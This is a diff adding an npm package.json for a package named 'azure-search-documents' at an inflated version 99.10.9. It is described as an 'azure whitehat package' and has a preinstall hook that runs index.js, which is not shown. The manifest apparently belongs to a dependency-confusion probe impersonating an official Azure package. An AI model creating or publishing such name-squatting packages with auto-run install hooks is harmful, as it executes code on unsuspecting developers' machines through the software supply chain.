@@ -1,0 +1,39 @@
+{
+    "name": "azure-search-documents",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-search-documents@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-OfQgZuX81trLX1kTvY3cnvDp667B3aJ9NelXmSrGlDmPFi0tL6pHeZDn4nrpmlBLh1nkvEehnWnbeCRaXg3S7A==",
+        "shasum": "475c2fad9849679687d15c89f67e09f2b8fb558d",
+        "tarball": "https://registry.npmjs.org/azure-search-documents/-/azure-search-documents-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3586,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoStKCRA9TVsSAnZWagAAPeMP/A2X1XQqVbkjOgn39sFE\noPLUB43jOdYlQ0powRCrd9a+E2iLp1Av4vw7jiVOW4fDwZE0qyim9mssj9x1\nEfAbgUDD5l6JtIoneJLHGMGNafpUfD0cR4G+N62nkU+HXngBeU0UDyduRjsY\nMvh/FEL/c7sgWjTKIy1tz4MKCpqTvIIFcPzcKIUZpYFEqfGzCK3ETyyR4dKL\nzZNljBs3pL+dMMzvbAr0nvK3cF06jeROOTaC2Qv6szmYl4g8FzJtvRiNH1JV\n+wNv70oWooqdS3Ae7sDNhNjwbI4ZqKkKbn2/oFo7msLoq/KcTk8uVi6d7h4q\n5eFAIvJ75tqxeHnB7dJ/uNIFe4hsuBNVo4LQY9Ouf8faJwU42du+1HPJNfvj\nFVQMt92ewCTGRtpKdWCMuHxEn0PLmYTBmcCJARxmjsAPoY7F8Gn9N5lomcRa\n+xwjZygSEtOYLNdxHH9QgURh6w0UCx9YwLLyZ5IhzI+eLACgJwpbL2emGm1y\nJTacCGYRAU8ykYKkFVcxj87Tatvpao7EnOkJnBohkLDexv/5Poqkn3TsqCvD\nAI+B+e+zrgqATsfIDPSzeB4YRHR98k/3Qpd/P08nyqYVVyEpAuS1HlGrVwLu\nOfPDgFt03OVvrQOwNxhtxNkm0qz9iqHXL42MD0BL+fgZ1oNPX+5Abwqzmd7d\n9yQX\r\n=ajcz\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-search-documents_99.10.9_1637952330044_0.4296877497670535"
+    },
+    "_hasShrinkwrap": false
+}
